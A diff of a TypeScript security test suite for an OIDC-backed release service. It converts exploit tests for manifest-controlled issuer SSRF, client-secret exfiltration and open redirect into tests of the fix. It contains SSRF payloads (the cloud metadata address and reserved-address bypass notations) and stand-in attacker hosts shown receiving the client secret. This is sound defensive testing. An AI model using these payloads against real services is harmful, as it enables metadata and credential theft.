@@ -32,9 +32,21 @@ import {
 import { handleAuthCallback, handleAuthStart } from "../../src/oidc.js";
 import { handleMintAuth } from "../../src/edgeMint.js";
 import { handleRelease } from "../../src/release/index.js";
-import type { FetchImpl } from "../../src/release/githubApp.js";
-import { parseRepoUrl } from "../../src/release/linkRepo.js";
-import { parseManifest } from "../../src/release/manifest.js";
+import {
+  type FetchImpl,
+  installationTokenSlot,
+} from "../../src/release/githubApp.js";
+import { seal } from "../../src/keyvault.js";
+import { linkRepo, parseRepoUrl } from "../../src/release/linkRepo.js";
+import { resyncRepo } from "../../src/release/resync.js";
+import {
+  fetchRepoFile,
+  MAX_REPO_FILE_BYTES,
+} from "../../src/release/github.js";
+import {
+  MAX_MANIFEST_BYTES,
+  parseManifest,
+} from "../../src/release/manifest.js";
 import { extractSummary } from "../../src/release/changelog.js";
 import { renderAppcast } from "../../src/release/appcast.js";
 import { applyOverrides } from "../../src/admin/lib/overrides.js";
@@ -105,6 +117,104 @@ async function seedCustomOidc(
   );
 }
 
+// ── `.pkey/` ingest helpers (linkRepo / resyncRepo) ──────────────────────────
+
+/** The REAL djdl manifest, used to prove the R9-01 ingest gate does not touch it. */
+const DJDL_PRODUCT_JSON = readFileSync(
+  join(HERE, "..", "..", "..", "..", "products", "djdl", "product.json"),
+  "utf8",
+);
+
+let ghAppKeyPem: string | undefined;
+
+/** A GitHub App env whose private key really signs, so `discoverInstallation` runs for real. */
+async function ghAppEnv(): Promise<Env> {
+  const env = makeEnv(new KvMock(), []);
+  env.GITHUB_APP_ID = "123456";
+  if (ghAppKeyPem === undefined) {
+    const pair = (await crypto.subtle.generateKey(
+      {
+        name: "RSASSA-PKCS1-v1_5",
+        modulusLength: 2048,
+        publicExponent: new Uint8Array([1, 0, 1]),
+        hash: "SHA-256",
+      },
+      true,
+      ["sign", "verify"],
+    )) as CryptoKeyPair;
+    const pkcs8 = (await crypto.subtle.exportKey(
+      "pkcs8",
+      pair.privateKey,
+    )) as ArrayBuffer;
+    let bin = "";
+    for (const b of new Uint8Array(pkcs8)) bin += String.fromCharCode(b);
+    const b64 = btoa(bin);
+    ghAppKeyPem = `-----BEGIN PRIVATE KEY-----\n${(b64.match(/.{1,64}/g) ?? [b64]).join("\n")}\n-----END PRIVATE KEY-----`;
+  }
+  env.GITHUB_APP_PRIVATE_KEY = ghAppKeyPem;
+  return env;
+}
+
+/** Encode text the way the GitHub Contents API does: base64 inside a JSON envelope. */
+function contentsResponse(text: string): Response {
+  return new Response(
+    JSON.stringify({
+      content: Buffer.from(text, "utf8").toString("base64"),
+      encoding: "base64",
+    }),
+    { status: 200 },
+  ) as unknown as Response;
+}
+
+/** Serve an in-memory `.pkey/` over the App + Contents endpoints a link/resync calls. */
+function pkeyFetch(files: Record<string, string>): {
+  fetchImpl: FetchImpl;
+  files: Record<string, string>;
+} {
+  const fetchImpl: FetchImpl = async (input) => {
+    const url = String(input);
+    if (url.endsWith("/installation"))
+      return new Response(JSON.stringify({ id: 4242 }), {
+        status: 200,
+      }) as unknown as Response;
+    if (url.includes("/access_tokens"))
+      return new Response(JSON.stringify({ token: "ghs_test" }), {
+        status: 201,
+      }) as unknown as Response;
+    for (const [path, body] of Object.entries(files)) {
+      if (url.includes(`/contents/${path}`)) return contentsResponse(body);
+    }
+    return new Response("not found", { status: 404 }) as unknown as Response;
+  };
+  return { fetchImpl, files };
+}
+
+/** A `.pkey/product` for slug `acme`, optionally naming a repo-chosen custom IdP. */
+function acmeProduct(
+  issuer?: string,
+  over: Record<string, unknown> = {},
+): string {
+  return JSON.stringify({
+    slug: "acme",
+    name: "Acme",
+    compatMin: "1.0.0",
+    compatMax: "9.0.0",
+    adminGroup: "acme-admins",
+    tiers: [{ id: "pro", label: "Pro" }],
+    ...(issuer
+      ? {
+          oidc: {
+            provider: "custom",
+            issuer,
+            clientId: "acme-client",
+            clientSecretSecret: "OIDC_SECRET__ACME",
+          },
+        }
+      : {}),
+    ...over,
+  });
+}
+
 function makeProduct(): Product {
   return {
     slug: SLUG,
@@ -168,14 +278,31 @@ async function seedReleaseConfig(
   );
 }
 
-/** Pre-seed the installation-token KV cache so no App JWT signing is needed. */
-async function seedGhToken(env: Env, installId = 42): Promise<void> {
+/**
+ * Pre-seed the installation-token KV cache so no App JWT signing is needed.
+ *
+ * The entry is SEALED and lives at the installation-scoped key (R5-03 / R12-03), which is
+ * why this goes through `installationTokenSlot` rather than hand-building `p:<slug>:gh-token:…`
+ * the way it used to: the cache slot is derived from `(installId, owner/repo)` now, never
+ * from whatever the caller passed as its scope argument.
+ */
+async function seedGhToken(
+  env: Env,
+  installId = 42,
+  scope = { owner: "acme", repo: SLUG },
+): Promise<void> {
+  const { key, ctx } = installationTokenSlot(installId, scope);
   await env.HOT.put(
-    `p:${SLUG}:gh-token:${installId}`,
-    JSON.stringify({
-      token: "ghs_installation_token",
-      expiresAt: 4_000_000_000,
-    }),
+    key,
+    await seal(
+      env,
+      JSON.stringify({
+        token: "ghs_installation_token",
+        expiresAt: 4_000_000_000,
+        granted: `${scope.owner}/${scope.repo}`,
+      }),
+      ctx,
+    ),
   );
 }
 
@@ -212,44 +339,247 @@ afterEach(() => {
 // R9-01 — SSRF + OIDC client-secret exfiltration via manifest-controlled issuer
 // ═════════════════════════════════════════════════════════════════════════════
 describe("R9-01 repo-manifest-controlled OIDC issuer -> SSRF + secret exfil", () => {
-  it("the manifest validator accepts http://169.254.169.254 (and any host) as an issuer", () => {
-    const res = parseManifest({
+  const oidcManifest = (issuer: string) =>
+    parseManifest({
       schema: CATALOG_JSON,
       product: JSON.stringify({
         slug: "djdl",
         name: "DJDL",
         oidc: {
           provider: "custom",
-          issuer: "http://169.254.169.254/latest/meta-data",
+          issuer,
           clientId: "djdl",
           clientSecretSecret: "OIDC_CLIENT_SECRET",
         },
       }),
     });
-    expect(res.ok).toBe(true);
-    if (!res.ok) return;
-    // No scheme/host/IP-literal restriction whatsoever.
-    expect(res.manifest.oidc?.issuer).toBe(
-      "http://169.254.169.254/latest/meta-data",
-    );
 
-    const exfil = parseManifest({
-      schema: CATALOG_JSON,
-      product: JSON.stringify({
-        slug: "djdl",
-        name: "DJDL",
-        oidc: {
-          provider: "custom",
-          issuer: "https://exfil.attacker.example",
-          clientId: "djdl",
-          clientSecretSecret: "OIDC_CLIENT_SECRET",
-        },
-      }),
-    });
-    expect(exfil.ok).toBe(true);
+  // FIXED (R9-01): `shared-manifest` no longer accepts "any absolute http(s) URL". The issuer
+  // must be https, and must not be a private / loopback / link-local / reserved address
+  // literal in any of the notations the WHATWG URL parser normalizes.
+  it("the manifest validator now REJECTS http:// and every reserved address literal", () => {
+    for (const issuer of [
+      "http://169.254.169.254/latest/meta-data", // IMDS, and plain http
+      "https://169.254.169.254/", // IMDS over https
+      "https://10.0.0.5/", // RFC 1918
+      "https://172.16.0.1/",
+      "https://192.168.1.1/",
+      "https://127.0.0.2/", // 127/8 — only the three exact loopback literals are exempt
+      "https://100.64.0.1/", // CGNAT
+      "https://0.0.0.0/",
+      "https://255.255.255.255/",
+      "https://[fd00::1]/", // fc00::/7 unique-local
+      "https://[fe80::1]/", // link-local
+      "https://[::ffff:169.254.169.254]/", // IPv4-mapped IMDS
+      "http://id.example/", // plain http on a non-loopback host
+      "ftp://id.example/",
+      "https://user:pw@id.example/", // embedded credentials
+      "https://id.example/?next=", // query would swallow the concatenated path
+    ]) {
+      const res = oidcManifest(issuer);
+      expect(res.ok, issuer).toBe(false);
+      if (res.ok) continue;
+      expect(res.errors.join("\n")).toContain("oidc.issuer");
+    }
   });
 
-  it("POSTs the sealed client_secret to the attacker-chosen issuer host", async () => {
+  it("still accepts a real IdP, and the three exact loopback literals as the dev carve-out", () => {
+    for (const issuer of [
+      "https://id.example",
+      "https://id.example/oidc",
+      // Loopback is the ONE deliberate exception, and it is the only host `http:` buys you.
+      // It exists because `wrangler dev` against a local IdP is a real workflow, and because
+      // the operator-set platform issuer runs through the same predicate.
+      "http://localhost:8788",
+      "http://127.0.0.1:8788",
+      "https://localhost:8443",
+      "https://2130706433/", // 127.0.0.1 as a decimal integer — normalizes to loopback
+      "http://[::1]:8788",
+    ]) {
+      expect(oidcManifest(issuer).ok, issuer).toBe(true);
+    }
+  });
+
+  // FIXED (R9-01) — at INGEST, which is where the residual actually closed. A character-class
+  // guard still cannot tell a real IdP from an attacker's IdP-shaped host, so the manifest
+  // below still PARSES. What changed is that parsing is no longer enough to reach D1:
+  // `linkRepo` refuses a `provider: custom` manifest whose issuer host the operator has not
+  // put in `OIDC_ISSUER_ALLOWLIST`, and — unlike the sink's copy of the check — an unset
+  // allowlist refuses everything. A first write has no already-working row to protect.
+  it("FIXED: a public https attacker host still parses, but linkRepo refuses to persist it", async () => {
+    expect(oidcManifest("https://exfil.attacker.example").ok).toBe(true);
+
+    const db = makeTestDb();
+    const env = await ghAppEnv(); // deliberately no OIDC_ISSUER_ALLOWLIST
+    const stub = pkeyFetch({
+      ".pkey/schema.json": CATALOG_JSON,
+      ".pkey/product.json": acmeProduct("https://exfil.attacker.example"),
+    });
+
+    const res = await linkRepo(
+      env,
+      db,
+      "acme-org/acme-app",
+      NOW,
+      stub.fetchImpl,
+    );
+    expect(res.ok).toBe(false);
+    if (res.ok) return;
+    expect(res.error).toContain("OIDC_ISSUER_ALLOWLIST");
+    // Nothing landed — not the IdP row, not even the product it would have hung off.
+    expect(
+      await db.first<{ slug: string }>(
+        "SELECT slug FROM products WHERE slug = ?",
+        "acme",
+      ),
+    ).toBeNull();
+    expect(
+      await db.first<{ product: string }>(
+        "SELECT product FROM oidc_config WHERE product = ?",
+        "acme",
+      ),
+    ).toBeNull();
+
+    // ...and the operator half of the control still works: allowlist the host and it links.
+    env.OIDC_ISSUER_ALLOWLIST = "exfil.attacker.example";
+    const allowed = await linkRepo(
+      env,
+      db,
+      "acme-org/acme-app",
+      NOW,
+      stub.fetchImpl,
+    );
+    expect(allowed.ok, allowed.ok ? "" : allowed.error).toBe(true);
+    expect(
+      (
+        await db.first<{ issuer: string }>(
+          "SELECT issuer FROM oidc_config WHERE product = ?",
+          "acme",
+        )
+      )?.issuer,
+    ).toBe("https://exfil.attacker.example");
+  });
+
+  // FIXED (R9-01) at the other ingest path: a push may not CHANGE a stored issuer to an
+  // unlisted host. The gate runs before `resyncRepo`'s first write — everything after it is a
+  // sequence of un-batched `db.run`s — so a refused push applies none of the manifest, not
+  // just none of the OIDC row.
+  it("resyncRepo refuses a CHANGED issuer, and applies nothing else from that push", async () => {
+    const db = makeTestDb();
+    const env = await ghAppEnv();
+    env.OIDC_ISSUER_ALLOWLIST = "id.example";
+    const stub = pkeyFetch({
+      ".pkey/schema.json": CATALOG_JSON,
+      ".pkey/product.json": acmeProduct("https://id.example"),
+    });
+    expect(
+      (await linkRepo(env, db, "acme-org/acme-app", NOW, stub.fetchImpl)).ok,
+    ).toBe(true);
+
+    // A repo writer repoints the IdP and renames the product in the same push.
+    stub.files[".pkey/product.json"] = acmeProduct(
+      "https://exfil.attacker.example",
+      { name: "Pwned" },
+    );
+    const res = await resyncRepo(env, db, "acme", NOW + 10, stub.fetchImpl);
+    expect(res.ok).toBe(false);
+    if (res.ok) return;
+    expect(res.error).toContain("OIDC_ISSUER_ALLOWLIST");
+
+    expect(
+      (
+        await db.first<{ issuer: string }>(
+          "SELECT issuer FROM oidc_config WHERE product = ?",
+          "acme",
+        )
+      )?.issuer,
+    ).toBe("https://id.example");
+    expect(
+      (
+        await db.first<{ name: string }>(
+          "SELECT name FROM products WHERE slug = ?",
+          "acme",
+        )
+      )?.name,
+    ).toBe("Acme");
+  });
+
+  // The other half of the rule, and the reason the gate is on the CHANGE rather than on the
+  // value: an issuer already in D1 keeps working. Withdrawing the allowlist entirely must not
+  // take a running product's login down on the next push it happens to receive.
+  it("resyncRepo leaves an UNCHANGED stored issuer alone, even with the allowlist withdrawn", async () => {
+    const db = makeTestDb();
+    const env = await ghAppEnv();
+    env.OIDC_ISSUER_ALLOWLIST = "id.example";
+    const stub = pkeyFetch({
+      ".pkey/schema.json": CATALOG_JSON,
+      ".pkey/product.json": acmeProduct("https://id.example"),
+    });
+    expect(
+      (await linkRepo(env, db, "acme-org/acme-app", NOW, stub.fetchImpl)).ok,
+    ).toBe(true);
+
+    delete env.OIDC_ISSUER_ALLOWLIST;
+    stub.files[".pkey/product.json"] = acmeProduct("https://id.example", {
+      name: "Acme Renamed",
+    });
+    const res = await resyncRepo(env, db, "acme", NOW + 10, stub.fetchImpl);
+    expect(res.ok, res.ok ? "" : res.error).toBe(true);
+    expect(
+      (
+        await db.first<{ name: string }>(
+          "SELECT name FROM products WHERE slug = ?",
+          "acme",
+        )
+      )?.name,
+    ).toBe("Acme Renamed");
+    expect(
+      (
+        await db.first<{ issuer: string }>(
+          "SELECT issuer FROM oidc_config WHERE product = ?",
+          "acme",
+        )
+      )?.issuer,
+    ).toBe("https://id.example");
+  });
+
+  // The constraint that made this fix shippable. `djdl` — the only product in-tree — declares
+  // `provider: "platform"` and names no issuer at all, so it never reaches the gate. Linked
+  // AND resynced here from its real `products/djdl/product.json`, with no allowlist set.
+  it('a provider:"platform" product (djdl\'s real manifest) links and resyncs with no allowlist', async () => {
+    const db = makeTestDb();
+    const env = await ghAppEnv(); // deliberately no OIDC_ISSUER_ALLOWLIST
+    const stub = pkeyFetch({
+      ".pkey/schema.json": CATALOG_JSON,
+      ".pkey/product.json": DJDL_PRODUCT_JSON,
+    });
+
+    const linked = await linkRepo(
+      env,
+      db,
+      "vladzaharia/djdl",
+      NOW,
+      stub.fetchImpl,
+    );
+    expect(linked.ok, linked.ok ? "" : linked.error).toBe(true);
+    const oidc = await db.first<{ provider: string; issuer: string }>(
+      "SELECT provider, issuer FROM oidc_config WHERE product = ?",
+      SLUG,
+    );
+    expect(oidc?.provider).toBe("platform");
+    expect(oidc?.issuer).toBe(""); // no repo-supplied issuer exists to gate
+
+    const res = await resyncRepo(env, db, SLUG, NOW + 10, stub.fetchImpl);
+    expect(res.ok, res.ok ? "" : res.error).toBe(true);
+  });
+
+  // RESIDUAL, and deliberate. The gate above is at INGEST. At the SINK, an `oidc_config` row
+  // that is ALREADY in D1 is still honoured when no allowlist is configured, because
+  // `resolveOidcConfig` cannot tell a row an operator wrote last year from one an attacker's
+  // push wrote five minutes ago — and failing closed there would take every already-configured
+  // custom-OIDC product offline on the deploy that ships this code. Operators who want that
+  // window closed too set `OIDC_ISSUER_ALLOWLIST` (asserted two tests below).
+  it("RESIDUAL: a row ALREADY in D1 still receives the client_secret when no allowlist is set", async () => {
     const db = makeTestDb();
     const kv = new KvMock();
     const env = makeEnv(kv, [SLUG]);
@@ -284,17 +614,18 @@ describe("R9-01 repo-manifest-controlled OIDC issuer -> SSRF + secret exfil", ()
       NOW,
     );
     expect(res.status).toBe(502); // token exchange "failed" — but it was already sent
-
     expect(calls).toHaveLength(1);
     expect(calls[0]!.url).toBe("https://exfil.attacker.example/api/oidc/token");
-    // The platform's OIDC client secret is in the exfiltrated request body.
     expect(calls[0]!.body).toContain(
       "client_secret=SUPER-SECRET-oidc-client-secret",
     );
-    expect(calls[0]!.body).toContain("code=ATTACKER_CODE");
   });
 
-  it("also reaches link-local/IMDS addresses — no IP or scheme guard at the sink", async () => {
+  // FIXED (R9-01) at the SINK, not just at ingest: `resolveOidcConfig` re-applies the same
+  // predicate to what is actually stored in D1, so a row written before this landed — exactly
+  // what this test seeds, straight into `oidc_config` — cannot drive the request either. Note
+  // the request count: zero. Nothing leaves the box, and the secret is never even unsealed.
+  it("a pre-existing link-local issuer row no longer reaches the token endpoint", async () => {
     const db = makeTestDb();
     const kv = new KvMock();
     const env = makeEnv(kv, [SLUG]);
@@ -312,25 +643,61 @@ describe("R9-01 repo-manifest-controlled OIDC issuer -> SSRF + secret exfil", ()
     );
 
     const calls = recordGlobalFetch();
-    await handleAuthCallback(
+    const res = await handleAuthCallback(
       req(`https://key.plrs.im/${SLUG}/auth/callback?code=c&state=S`),
       env,
       db,
       product,
       NOW,
     );
-    expect(calls[0]!.url).toBe(
-      "http://169.254.169.254/latest/meta-data/api/oidc/token",
-    );
+    expect(res.status).toBe(500);
+    expect(calls).toEqual([]);
   });
 
-  it("the redirect_uris allowlist does NOT constrain the issuer (it only checks our own URI)", async () => {
+  // FIXED (R9-01, defence in depth): with `OIDC_ISSUER_ALLOWLIST` set, even a well-formed
+  // public https issuer is refused unless the operator listed its host. This is the control
+  // that closes the residual above — it is opt-in, and unset means unenforced.
+  it("OIDC_ISSUER_ALLOWLIST refuses an unlisted host, and permits a listed one", async () => {
+    for (const [allowlist, expectedCalls] of [
+      ["id.example, other.example", 0],
+      ["id.example, exfil.attacker.example", 1],
+    ] as const) {
+      const db = makeTestDb();
+      const env = makeEnv(new KvMock(), [SLUG]);
+      env.OIDC_ISSUER_ALLOWLIST = allowlist;
+      await seedProduct(db, SLUG);
+      await seedProductSecret(db, SLUG, "OIDC_CLIENT_SECRET", "sekrit");
+      await seedCustomOidc(db, "https://exfil.attacker.example");
+      const product = (await loadProduct(env, db, SLUG))!;
+      await env.HOT.put(
+        `p:${SLUG}:flow:S3`,
+        JSON.stringify({
+          verifier: "v",
+          nonce: "n",
+          redirectUri: `https://key.plrs.im/${SLUG}/auth/callback`,
+        }),
+      );
+      const calls = recordGlobalFetch();
+      await handleAuthCallback(
+        req(`https://key.plrs.im/${SLUG}/auth/callback?code=c&state=S3`),
+        env,
+        db,
+        product,
+        NOW,
+      );
+      expect(calls.length, allowlist).toBe(expectedCalls);
+      vi.restoreAllMocks();
+    }
+  });
+
+  it("the redirect_uris allowlist still does NOT constrain the issuer (it only checks our own URI)", async () => {
     const db = makeTestDb();
     const kv = new KvMock();
     const env = makeEnv(kv, [SLUG]);
     await seedProduct(db, SLUG);
     await seedProductSecret(db, SLUG, "OIDC_CLIENT_SECRET", "sekrit");
-    // Allowlist is populated and correct — and still irrelevant to the issuer host.
+    // Allowlist is populated and correct — and still irrelevant to the issuer host. This is
+    // why the issuer needed its own guard rather than leaning on this one.
     await seedCustomOidc(db, "https://exfil.attacker.example", {
       redirectUris: [`https://key.plrs.im/${SLUG}/auth/callback`],
     });
@@ -359,9 +726,31 @@ describe("R9-01 repo-manifest-controlled OIDC issuer -> SSRF + secret exfil", ()
 // R9-02 — unauthenticated open redirect to the manifest-controlled issuer
 // ═════════════════════════════════════════════════════════════════════════════
 describe("R9-02 /<product>/auth/start is an open redirect to the configured issuer", () => {
-  it("302s an anonymous visitor to an arbitrary attacker host", async () => {
+  // FIXED (R9-02) by the R9-01 fix, as predicted: `handleAuthStart` builds its 302 from
+  // `resolveOidcConfig().issuer`, so the sink guard that stops the token POST also stops the
+  // redirect. An anonymous visitor gets a 500 and no `Location` at all.
+  it("no longer 302s an anonymous visitor to a reserved-address host", async () => {
     const db = makeTestDb();
     const env = makeEnv(new KvMock(), [SLUG]);
+    await seedProduct(db, SLUG);
+    await seedProductSecret(db, SLUG, "OIDC_CLIENT_SECRET", "sekrit");
+    await seedCustomOidc(db, "http://169.254.169.254/");
+    const product = (await loadProduct(env, db, SLUG))!;
+
+    const res = await handleAuthStart(
+      req(`https://key.plrs.im/${SLUG}/auth/start`),
+      env,
+      db,
+      product,
+    );
+    expect(res.status).toBe(500);
+    expect(res.headers.get("location")).toBeNull();
+  });
+
+  it("and an operator allowlist closes the public-host variant of the same redirect", async () => {
+    const db = makeTestDb();
+    const env = makeEnv(new KvMock(), [SLUG]);
+    env.OIDC_ISSUER_ALLOWLIST = "id.example";
     await seedProduct(db, SLUG);
     await seedProductSecret(db, SLUG, "OIDC_CLIENT_SECRET", "sekrit");
     await seedCustomOidc(db, "https://phish.attacker.example");
@@ -373,12 +762,8 @@ describe("R9-02 /<product>/auth/start is an open redirect to the configured issu
       db,
       product,
     );
-    expect(res.status).toBe(302);
-    const loc = new URL(res.headers.get("location")!);
-    expect(loc.host).toBe("phish.attacker.example");
-    expect(loc.pathname).toBe("/authorize");
-    // ...and it leaks our client_id + redirect_uri to that host.
-    expect(loc.searchParams.get("client_id")).toBe("client-djdl");
+    expect(res.status).toBe(500);
+    expect(res.headers.get("location")).toBeNull();
   });
 });
 
@@ -511,7 +896,9 @@ describe("R9-04 gh_owner/gh_repo path injection", () => {
     const env = makeEnv(new KvMock(), [SLUG]);
     await seedProduct(db, SLUG);
     await seedReleaseConfig(db, { gh_owner: "acme", gh_repo: ".." });
-    await seedGhToken(env);
+    // The cache slot follows the repo coordinates now (R5-03), so seed the one this config
+    // will actually look up.
+    await seedGhToken(env, 42, { owner: "acme", repo: ".." });
     const { fetchImpl, calls } = recordingFetchImpl([]);
 
     await ignoreMiss(
@@ -929,22 +1316,34 @@ describe("R9-10 KV key construction", () => {
     expect(await kv.get(`p:${SLUG}:device-flow:VICTIM`)).not.toBeNull();
   });
 
-  it("linkRepo scopes the installation-token cache by REPO NAME, not product slug", () => {
+  // FIXED (R5-03), now on both halves. `getInstallationToken` derives the cache key itself
+  // from `(installId, down-scope)` rather than from the caller's argument, AND the two callers
+  // that used to pass a bare repo name — `linkRepo.ts` and `resync.ts` — now pass a structured
+  // `{owner, repo}` scope, so they no longer take the legacy installation-wide path at all.
+  it("the installation-token cache key no longer comes from the caller's scope argument", () => {
     const src = readFileSync(
       join(HERE, "..", "..", "src", "release", "linkRepo.ts"),
       "utf8",
     );
-    // `getInstallationToken(env, repo, installId, ...)` — the 2nd arg is `pk()`'s
-    // product scope, so the cache key is `p:<repo>:gh-token:<id>`.
-    expect(src).toContain(
+    // The bare-repo-name call site is gone; the scope is structured.
+    expect(src).not.toContain(
       "getInstallationToken(env, repo, installId, now, fetchImpl)",
     );
-    // ...while every other caller passes the product slug.
-    const relSrc = readFileSync(
-      join(HERE, "..", "..", "src", "release", "index.ts"),
-      "utf8",
+    expect(src.replace(/\s+/g, " ")).toContain(
+      "getInstallationToken( env, { owner, repo }, installId, now, fetchImpl, )",
     );
-    expect(relSrc).toContain("cfg.gh_installation_id");
+    // ...yet a repo-name caller and a slug caller can no longer collide: neither string
+    // reaches the key, and the two down-scopes are distinct entries.
+    const legacy = installationTokenSlot(42, SLUG).key;
+    const scoped = installationTokenSlot(42, {
+      owner: "acme",
+      repo: SLUG,
+    }).key;
+    expect(legacy).not.toBe(scoped);
+    expect(scoped).toBe(`gh:install:42:token:acme/${SLUG}`);
+    // The old key shape — `p:<whatever-the-caller-passed>:gh-token:<id>` — is gone entirely.
+    expect(scoped.startsWith("p:")).toBe(false);
+    expect(legacy.startsWith("p:")).toBe(false);
   });
 });
 
@@ -1148,5 +1547,90 @@ describe("R9-14 handleRelease try/catch never catches", () => {
       fetchImpl,
     );
     expect(res.status).toBe(404);
+  });
+});
+
+// ═════════════════════════════════════════════════════════════════════════════
+// R9-16 — fetchRepoFile fetched and decoded an unbounded `.pkey/` body
+// ═════════════════════════════════════════════════════════════════════════════
+//
+// R7-02's cap landed at the PARSER (`MAX_MANIFEST_BYTES`, on the decoded manifest). That is
+// the wrong end of a 128 MB isolate to discover that a repo writer committed a 200 MB
+// `.pkey/product.yaml`: `fetchRepoFile` had already buffered the whole JSON envelope and
+// base64-decoded it before `parseDocument` got a look. The cap is now enforced at the fetch as
+// well, on the response body, with headroom for base64 + envelope.
+describe("R9-16 fetchRepoFile response-body cap", () => {
+  /** A body of `chunks × bytes`, counting how many chunks the reader actually pulled. */
+  function countingBody(
+    chunks: number,
+    bytes: number,
+    seen: { pulled: number },
+  ): ReadableStream<Uint8Array> {
+    return new ReadableStream<Uint8Array>({
+      pull(c) {
+        if (seen.pulled >= chunks) {
+          c.close();
+          return;
+        }
+        seen.pulled += 1;
+        c.enqueue(new Uint8Array(bytes));
+      },
+    });
+  }
+
+  it("refuses a declared over-cap Content-Length before consuming the body", async () => {
+    const seen = { pulled: 0 };
+    const fetchImpl: FetchImpl = async () =>
+      new Response(countingBody(64, 64 * 1024, seen), {
+        status: 200,
+        headers: { "content-length": String(MAX_REPO_FILE_BYTES + 1) },
+      }) as unknown as Response;
+
+    // The `: <n> bytes` form (rather than `: >…`) is the tell: this is the DECLARED-size
+    // short-circuit, taken before a single byte was accounted for.
+    await expect(
+      fetchRepoFile("tok", "acme", "app", ".pkey/product.yaml", fetchImpl),
+    ).rejects.toThrow(
+      new RegExp(`repo file too large: ${MAX_REPO_FILE_BYTES + 1} bytes`),
+    );
+    // Whatever the stream implementation prefetched, the 4 MB body was never drained.
+    expect(seen.pulled).toBeLessThan(16);
+  });
+
+  it("a MISSING Content-Length cannot defeat the cap — the streamed accounting enforces it", async () => {
+    const seen = { pulled: 0 };
+    const fetchImpl: FetchImpl = async () =>
+      // No `content-length` at all: the header check is the cheap path, not the enforcement.
+      new Response(countingBody(64, 64 * 1024, seen), {
+        status: 200,
+      }) as unknown as Response;
+
+    await expect(
+      fetchRepoFile("tok", "acme", "app", ".pkey/product.yaml", fetchImpl),
+    ).rejects.toThrow(
+      new RegExp(`repo file too large: >${MAX_REPO_FILE_BYTES} bytes`),
+    );
+    // Cancelled shortly after the cap was passed rather than draining all 4 MB.
+    expect(seen.pulled).toBeLessThan(16);
+  });
+
+  it("a full-size legal manifest still round-trips: the cap has base64 + envelope headroom", async () => {
+    const text = "#".repeat(MAX_MANIFEST_BYTES); // exactly the parser's cap
+    const envelope = JSON.stringify({
+      content: Buffer.from(text, "utf8").toString("base64"),
+      encoding: "base64",
+    });
+    expect(Buffer.byteLength(envelope)).toBeLessThan(MAX_REPO_FILE_BYTES);
+    const fetchImpl: FetchImpl = async () =>
+      new Response(envelope, { status: 200 }) as unknown as Response;
+    expect(
+      await fetchRepoFile(
+        "tok",
+        "acme",
+        "app",
+        ".pkey/product.yaml",
+        fetchImpl,
+      ),
+    ).toBe(text);
   });
 });
